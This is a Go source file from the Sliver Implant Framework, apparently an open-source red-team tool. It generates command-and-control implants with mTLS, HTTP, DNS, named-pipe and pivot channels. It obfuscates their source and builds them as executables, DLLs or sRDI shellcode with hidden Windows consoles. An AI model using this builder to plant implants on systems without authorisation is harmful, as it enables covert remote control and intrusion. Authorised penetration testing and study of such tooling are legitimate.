package generate

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"errors"
	"fmt"
	"io/ioutil"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/assets"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/gobfuscate"
	"github.com/bishopfox/sliver/server/gogo"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/util"

	"github.com/gobuffalo/packr"
)

var (
	buildLog = log.NamedLogger("generate", "build")
	// Fix #67: use an arch specific compiler
	defaultMingwPath = map[string]string{
		"386":   "/usr/bin/i686-w64-mingw32-gcc",
		"amd64": "/usr/bin/x86_64-w64-mingw32-gcc",
	}
)

const (
	// WINDOWS OS
	WINDOWS = "windows"

	// DARWIN / MacOS
	DARWIN = "darwin"

	// LINUX OS
	LINUX = "linux"

	clientsDirName = "clients"
	sliversDirName = "slivers"

	encryptKeySize = 16

	// DefaultReconnectInterval - In seconds
	DefaultReconnectInterval = 60
	// DefaultMTLSLPort - Default listen port
	DefaultMTLSLPort = 8888
	// DefaultHTTPLPort - Default HTTP listen port
	DefaultHTTPLPort = 443 // Assume SSL, it'll fallback

	// SliverCC64EnvVar - Environment variable that can specify the 64 bit mingw path
	SliverCC64EnvVar = "SLIVER_CC_64"
	// SliverCC32EnvVar - Environment variable that can specify the 32 bit mingw path
	SliverCC32EnvVar = "SLIVER_CC_32"
)

// ImplantConfig - Parameters when generating a implant
type ImplantConfig struct {
	// Go
	GOOS   string `json:"go_os"`
	GOARCH string `json:"go_arch"`

	// Standard
	Name                string `json:"name"`
	CACert              string `json:"ca_cert"`
	Cert                string `json:"cert"`
	Key                 string `json:"key"`
	Debug               bool   `json:"debug"`
	ObfuscateSymbols    bool   `json:"obfuscate_symbols"`
	ReconnectInterval   int    `json:"reconnect_interval"`
	MaxConnectionErrors int    `json:"max_connection_errors"`

	C2                []ImplantC2 `json:"c2s"`
	MTLSc2Enabled     bool        `json:"c2_mtls_enabled"`
	HTTPc2Enabled     bool        `json:"c2_http_enabled"`
	DNSc2Enabled      bool        `json:"c2_dns_enabled"`
	CanaryDomains     []string    `json:"canary_domains"`
	NamePipec2Enabled bool        `json:"c2_namedpipe_enabled"`
	TCPPivotc2Enabled bool        `json:"c2_tcppivot_enabled"`

	// Limits
	LimitDomainJoined bool   `json:"limit_domainjoined"`
	LimitHostname     string `json:"limit_hostname"`
	LimitUsername     string `json:"limit_username"`
	LimitDatetime     string `json:"limit_datetime"`

	// Output Format
	Format clientpb.ImplantConfig_OutputFormat `json:"format"`

	// For 	IsSharedLib bool `json:"is_shared_lib"`
	IsSharedLib bool `json:"is_shared_lib"`
	IsService   bool `json:"is_service"`

	FileName string
}

// ToProtobuf - Convert ImplantConfig to protobuf equiv
func (c *ImplantConfig) ToProtobuf() *clientpb.ImplantConfig {
	config := &clientpb.ImplantConfig{
		GOOS:             c.GOOS,
		GOARCH:           c.GOARCH,
		Name:             c.Name,
		CACert:           c.CACert,
		Cert:             c.Cert,
		Key:              c.Key,
		Debug:            c.Debug,
		ObfuscateSymbols: c.ObfuscateSymbols,
		CanaryDomains:    c.CanaryDomains,

		ReconnectInterval:   uint32(c.ReconnectInterval),
		MaxConnectionErrors: uint32(c.MaxConnectionErrors),

		LimitDatetime:     c.LimitDatetime,
		LimitDomainJoined: c.LimitDomainJoined,
		LimitHostname:     c.LimitHostname,
		LimitUsername:     c.LimitUsername,

		IsSharedLib: c.IsSharedLib,
		IsService:   c.IsService,
		Format:      c.Format,

		FileName: c.FileName,
	}
	config.C2 = []*clientpb.ImplantC2{}
	for _, c2 := range c.C2 {
		config.C2 = append(config.C2, c2.ToProtobuf())
	}
	return config
}

// ImplantConfigFromProtobuf - Create a native config struct from Protobuf
func ImplantConfigFromProtobuf(pbConfig *clientpb.ImplantConfig) *ImplantConfig {
	cfg := &ImplantConfig{}

	cfg.GOOS = pbConfig.GOOS
	cfg.GOARCH = pbConfig.GOARCH
	cfg.Name = pbConfig.Name
	cfg.CACert = pbConfig.CACert
	cfg.Cert = pbConfig.Cert
	cfg.Key = pbConfig.Key
	cfg.Debug = pbConfig.Debug
	cfg.ObfuscateSymbols = pbConfig.ObfuscateSymbols
	cfg.CanaryDomains = pbConfig.CanaryDomains

	cfg.ReconnectInterval = int(pbConfig.ReconnectInterval)
	cfg.MaxConnectionErrors = int(pbConfig.MaxConnectionErrors)

	cfg.LimitDomainJoined = pbConfig.LimitDomainJoined
	cfg.LimitDatetime = pbConfig.LimitDatetime
	cfg.LimitUsername = pbConfig.LimitUsername
	cfg.LimitHostname = pbConfig.LimitHostname

	cfg.Format = pbConfig.Format
	cfg.IsSharedLib = pbConfig.IsSharedLib
	cfg.IsService = pbConfig.IsService

	cfg.C2 = copyC2List(pbConfig.C2)
	cfg.MTLSc2Enabled = isC2Enabled([]string{"mtls"}, cfg.C2)
	cfg.HTTPc2Enabled = isC2Enabled([]string{"http", "https"}, cfg.C2)
	cfg.DNSc2Enabled = isC2Enabled([]string{"dns"}, cfg.C2)
	cfg.NamePipec2Enabled = isC2Enabled([]string{"namedpipe"}, cfg.C2)
	cfg.TCPPivotc2Enabled = isC2Enabled([]string{"tcppivot"}, cfg.C2)

	cfg.FileName = pbConfig.FileName
	return cfg
}

func copyC2List(src []*clientpb.ImplantC2) []ImplantC2 {
	c2s := []ImplantC2{}
	for _, srcC2 := range src {
		c2URL, err := url.Parse(srcC2.URL)
		if err != nil {
			buildLog.Warnf("Failed to parse c2 url %v", err)
			continue
		}
		c2s = append(c2s, ImplantC2{
			Priority: srcC2.Priority,
			URL:      c2URL.String(),
			Options:  srcC2.Options,
		})
	}
	return c2s
}

func isC2Enabled(schemes []string, c2s []ImplantC2) bool {
	for _, c2 := range c2s {
		c2URL, err := url.Parse(c2.URL)
		if err != nil {
			buildLog.Warnf("Failed to parse c2 url %v", err)
			continue
		}
		for _, scheme := range schemes {
			if scheme == c2URL.Scheme {
				return true
			}
		}
	}
	buildLog.Debugf("No %v URLs found in %v", schemes, c2s)
	return false
}

// ImplantC2 - C2 struct
type ImplantC2 struct {
	Priority uint32 `json:"priority"`
	URL      string `json:"url"`
	Options  string `json:"options"`
}

// ToProtobuf - Convert to protobuf version
func (s ImplantC2) ToProtobuf() *clientpb.ImplantC2 {
	return &clientpb.ImplantC2{
		Priority: s.Priority,
		URL:      s.URL,
		Options:  s.Options,
	}
}

func (s ImplantC2) String() string {
	return s.URL
}

// GetSliversDir - Get the binary directory
func GetSliversDir() string {
	appDir := assets.GetRootAppDir()
	sliversDir := path.Join(appDir, sliversDirName)
	if _, err := os.Stat(sliversDir); os.IsNotExist(err) {
		buildLog.Infof("Creating bin directory: %s", sliversDir)
		err = os.MkdirAll(sliversDir, 0700)
		if err != nil {
			buildLog.Fatal(err)
		}
	}
	return sliversDir
}

// -----------------------
// Sliver Generation Code
// -----------------------

// SliverShellcode - Generates a sliver shellcode using sRDI
func SliverShellcode(config *ImplantConfig) (string, error) {
	// Compile go code
	var crossCompiler string
	appDir := assets.GetRootAppDir()
	// Don't use a cross-compiler if the target bin is built on the same platform
	// as the sliver-server.
	if runtime.GOOS != config.GOOS {
		crossCompiler = getCCompiler(config.GOARCH)
		if crossCompiler == "" {
			return "", errors.New("No cross-compiler (mingw) found")
		}
	}
	goConfig := &gogo.GoConfig{
		CGO:    "1",
		CC:     crossCompiler,
		GOOS:   config.GOOS,
		GOARCH: config.GOARCH,
		GOROOT: gogo.GetGoRootDir(appDir),
	}
	pkgPath, err := renderSliverGoCode(config, goConfig)
	if err != nil {
		return "", err
	}

	dest := path.Join(goConfig.GOPATH, "bin", config.Name)
	dest += ".bin"

	tags := []string{"netgo"}
	ldflags := []string{"-s -w -buildid="}
	if !config.Debug && goConfig.GOOS == WINDOWS {
		ldflags[0] += " -H=windowsgui"
	}
	// Keep those for potential later use
	gcflags := fmt.Sprintf("")
	asmflags := fmt.Sprintf("")
	// trimpath is now a separate flag since Go 1.13
	trimpath := "-trimpath"
	_, err = gogo.GoBuild(*goConfig, pkgPath, dest, "c-shared", tags, ldflags, gcflags, asmflags, trimpath)
	config.FileName = path.Base(dest)
	shellcode, err := ShellcodeRDI(dest, "RunSliver", "")
	if err != nil {
		return "", err
	}
	err = ioutil.WriteFile(dest, shellcode, 0755)
	if err != nil {
		return "", err
	}
	config.Format = clientpb.ImplantConfig_SHELLCODE
	// Save to database
	saveFileErr := ImplantFileSave(config.Name, dest)
	saveCfgErr := ImplantConfigSave(config)
	if saveFileErr != nil || saveCfgErr != nil {
		buildLog.Errorf("Failed to save file to db %s %s", saveFileErr, saveCfgErr)
	}
	return dest, err

}

// SliverSharedLibrary - Generates a sliver shared library (DLL/dylib/so) binary
func SliverSharedLibrary(config *ImplantConfig) (string, error) {
	// Compile go code
	var crossCompiler string
	appDir := assets.GetRootAppDir()
	// Don't use a cross-compiler if the target bin is built on the same platform
	// as the sliver-server.
	if runtime.GOOS != config.GOOS {
		crossCompiler = getCCompiler(config.GOARCH)
		if crossCompiler == "" {
			return "", errors.New("No cross-compiler (mingw) found")
		}
	}
	goConfig := &gogo.GoConfig{
		CGO:    "1",
		CC:     crossCompiler,
		GOOS:   config.GOOS,
		GOARCH: config.GOARCH,
		GOROOT: gogo.GetGoRootDir(appDir),
	}
	pkgPath, err := renderSliverGoCode(config, goConfig)
	if err != nil {
		return "", err
	}

	dest := path.Join(goConfig.GOPATH, "bin", config.Name)
	if goConfig.GOOS == WINDOWS {
		dest += ".dll"
	}
	if goConfig.GOOS == DARWIN {
		dest += ".dylib"
	}
	if goConfig.GOOS == LINUX {
		dest += ".so"
	}

	tags := []string{"netgo"}
	ldflags := []string{"-s -w -buildid="}
	if !config.Debug && goConfig.GOOS == WINDOWS {
		ldflags[0] += " -H=windowsgui"
	}
	// Keep those for potential later use
	gcflags := fmt.Sprintf("")
	asmflags := fmt.Sprintf("")
	// trimpath is now a separate flag since Go 1.13
	trimpath := "-trimpath"
	_, err = gogo.GoBuild(*goConfig, pkgPath, dest, "c-shared", tags, ldflags, gcflags, asmflags, trimpath)
	config.FileName = path.Base(dest)
	saveFileErr := ImplantFileSave(config.Name, dest)
	saveCfgErr := ImplantConfigSave(config)
	if saveFileErr != nil || saveCfgErr != nil {
		buildLog.Errorf("Failed to save file to db %s %s", saveFileErr, saveCfgErr)
	}
	return dest, err
}

// SliverExecutable - Generates a sliver executable binary
func SliverExecutable(config *ImplantConfig) (string, error) {

	// Compile go code
	appDir := assets.GetRootAppDir()
	cgo := "0"
	if config.IsSharedLib {
		cgo = "1"
	}
	goConfig := &gogo.GoConfig{
		CGO:    cgo,
		GOOS:   config.GOOS,
		GOARCH: config.GOARCH,
		GOROOT: gogo.GetGoRootDir(appDir),
	}
	pkgPath, err := renderSliverGoCode(config, goConfig)
	if err != nil {
		return "", err
	}

	dest := path.Join(goConfig.GOPATH, "bin", config.Name)
	if goConfig.GOOS == WINDOWS {
		dest += ".exe"
	}
	tags := []string{"netgo"}
	ldflags := []string{"-s -w -buildid="}
	if !config.Debug && goConfig.GOOS == WINDOWS {
		ldflags[0] += " -H=windowsgui"
	}
	gcflags := fmt.Sprintf("")
	asmflags := fmt.Sprintf("")
	// trimpath is now a separate flag since Go 1.13
	trimpath := "-trimpath"
	_, err = gogo.GoBuild(*goConfig, pkgPath, dest, "", tags, ldflags, gcflags, asmflags, trimpath)
	config.FileName = path.Base(dest)
	saveFileErr := ImplantFileSave(config.Name, dest)
	saveCfgErr := ImplantConfigSave(config)
	if saveFileErr != nil || saveCfgErr != nil {
		buildLog.Errorf("Failed to save file to db %s %s", saveFileErr, saveCfgErr)
	}
	return dest, err
}

// This function is a little too long, we should probably refactor it as some point
func renderSliverGoCode(config *ImplantConfig, goConfig *gogo.GoConfig) (string, error) {
	target := fmt.Sprintf("%s/%s", config.GOOS, config.GOARCH)
	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
		return "", fmt.Errorf("Invalid compiler target: %s", target)
	}

	if config.Name == "" {
		config.Name = GetCodename()
	}
	buildLog.Infof("Generating new sliver binary '%s'", config.Name)

	config.MTLSc2Enabled = isC2Enabled([]string{"mtls"}, config.C2)
	config.HTTPc2Enabled = isC2Enabled([]string{"http", "https"}, config.C2)
	config.DNSc2Enabled = isC2Enabled([]string{"dns"}, config.C2)
	config.NamePipec2Enabled = isC2Enabled([]string{"namedpipe"}, config.C2)
	config.TCPPivotc2Enabled = isC2Enabled([]string{"tcppivot"}, config.C2)

	sliversDir := GetSliversDir() // ~/.sliver/slivers
	projectGoPathDir := path.Join(sliversDir, config.GOOS, config.GOARCH, config.Name)
	os.MkdirAll(projectGoPathDir, 0700)
	goConfig.GOPATH = projectGoPathDir

	// Cert PEM encoded certificates
	serverCACert, _, _ := certs.GetCertificateAuthorityPEM(certs.ServerCA)
	sliverCert, sliverKey, err := certs.SliverGenerateECCCertificate(config.Name)
	if err != nil {
		return "", err
	}
	config.CACert = string(serverCACert)
	config.Cert = string(sliverCert)
	config.Key = string(sliverKey)

	// binDir - ~/.sliver/slivers/<os>/<arch>/<name>/bin
	binDir := path.Join(projectGoPathDir, "bin")
	os.MkdirAll(binDir, 0700)

	// srcDir - ~/.sliver/slivers/<os>/<arch>/<name>/src
	srcDir := path.Join(projectGoPathDir, "src")
	assets.SetupGoPath(srcDir)            // Extract GOPATH dependency files
	err = util.ChmodR(srcDir, 0600, 0700) // Ensures src code files are writable
	if err != nil {
		buildLog.Errorf("fs perms: %v", err)
		return "", err
	}

	sliverPkgDir := path.Join(srcDir, "github.com", "bishopfox", "sliver") // "main"
	os.MkdirAll(sliverPkgDir, 0700)

	// Load code template
	sliverBox := packr.NewBox("../../sliver")
	for index, boxName := range srcFiles {

		// Gobfuscate doesn't handle all the platform specific code
		// well and the renamer can get confused when symbols for a
		// different OS don't show up. So we just filter out anything
		// we're not actually going to compile into the final binary
		suffix := ".go"
		if strings.Contains(boxName, "_") {
			fileNameParts := strings.Split(boxName, "_")
			suffix = "_" + fileNameParts[len(fileNameParts)-1]
			if strings.HasSuffix(boxName, "_test.go") {
				buildLog.Infof("Skipping (test): %s", boxName)
				continue
			}
			osSuffix := fmt.Sprintf("_%s.go", strings.ToLower(config.GOOS))
			archSuffix := fmt.Sprintf("_%s.go", strings.ToLower(config.GOARCH))
			if !strings.HasSuffix(boxName, osSuffix) && !strings.HasSuffix(boxName, archSuffix) {
				buildLog.Infof("Skipping file wrong os/arch: %s", boxName)
				continue
			}
		}

		sliverGoCode, _ := sliverBox.FindString(boxName)

		// We need to correct for the "github.com/bishopfox/sliver/sliver/foo" imports, since Go
		// doesn't allow relative imports and "sliver" is a subdirectory of
		// the main "sliver" repo we need to fake this when coping the code
		// to our per-compile "GOPATH"
		var sliverCodePath string
		dirName := filepath.Dir(boxName)
		var fileName string
		// Skip dllmain files for anything non windows
		if boxName == "sliver.h" || boxName == "sliver.c" {
			if !config.IsSharedLib {
				continue
			}
		}
		if config.Debug || strings.HasSuffix(boxName, ".c") || strings.HasSuffix(boxName, ".h") {
			fileName = filepath.Base(boxName)
		} else {
			fileName = fmt.Sprintf("s%d%s", index, suffix)
		}
		if dirName != "." {
			// Add an extra "sliver" dir
			dirPath := path.Join(sliverPkgDir, "sliver", dirName)
			if _, err := os.Stat(dirPath); os.IsNotExist(err) {
				buildLog.Infof("[mkdir] %#v", dirPath)
				os.MkdirAll(dirPath, 0700)
			}
			sliverCodePath = path.Join(dirPath, fileName)
		} else {
			sliverCodePath = path.Join(sliverPkgDir, fileName)
		}

		fSliver, _ := os.Create(sliverCodePath)
		buf := bytes.NewBuffer([]byte{})
		buildLog.Infof("[render] %s -> %s", boxName, sliverCodePath)

		// Render code
		sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
		sliverCodeTmpl.Execute(buf, config)

		// Render canaries
		buildLog.Infof("Canary domain(s): %v", config.CanaryDomains)
		canaryTmpl := template.New("canary").Delims("[[", "]]")
		canaryGenerator := &CanaryGenerator{
			ImplantName:   config.Name,
			ParentDomains: config.CanaryDomains,
		}
		canaryTmpl, err := canaryTmpl.Funcs(template.FuncMap{
			"GenerateCanary": canaryGenerator.GenerateCanary,
		}).Parse(buf.String())
		canaryTmpl.Execute(fSliver, canaryGenerator)

		if err != nil {
			buildLog.Infof("Failed to render go code: %s", err)
			return "", err
		}
	}

	if !config.Debug {
		buildLog.Infof("Obfuscating source code ...")
		obfgoPath := path.Join(projectGoPathDir, "obfuscated")
		pkgName := "github.com/bishopfox/sliver"
		obfSymbols := config.ObfuscateSymbols
		obfKey := randomObfuscationKey()
		obfuscatedPkg, err := gobfuscate.Gobfuscate(*goConfig, obfKey, pkgName, obfgoPath, obfSymbols)
		if err != nil {
			buildLog.Infof("Error while obfuscating sliver %v", err)
			return "", err
		}
		goConfig.GOPATH = obfgoPath
		buildLog.Infof("Obfuscated GOPATH = %s", obfgoPath)
		buildLog.Infof("Obfuscated sliver package: %s", obfuscatedPkg)
		sliverPkgDir = path.Join(obfgoPath, "src", obfuscatedPkg) // new "main"
	}
	if err != nil {
		buildLog.Errorf("Failed to save sliver config %s", err)
	}
	return sliverPkgDir, nil
}

func getCCompiler(arch string) string {
	var found bool // meh, ugly
	var compiler string
	if arch == "amd64" {
		compiler = os.Getenv(SliverCC64EnvVar)
	}
	if arch == "386" {
		compiler = os.Getenv(SliverCC32EnvVar)
	}
	if compiler == "" {
		if compiler, found = defaultMingwPath[arch]; !found {
			compiler = defaultMingwPath["amd64"] // should not happen, but just in case ...
		}
	}
	if _, err := os.Stat(compiler); os.IsNotExist(err) {
		buildLog.Warnf("CC path %v does not exist", compiler)
		return ""
	}
	if runtime.GOOS == "windows" {
		compiler = "" // TODO: Add windows mingw support
	}
	buildLog.Infof("CC = %v", compiler)
	return compiler
}

func randomObfuscationKey() string {
	randBuf := make([]byte, 64) // 64 bytes of randomness
	rand.Read(randBuf)
	digest := sha256.Sum256(randBuf)
	return fmt.Sprintf("%x", digest[:encryptKeySize])
}
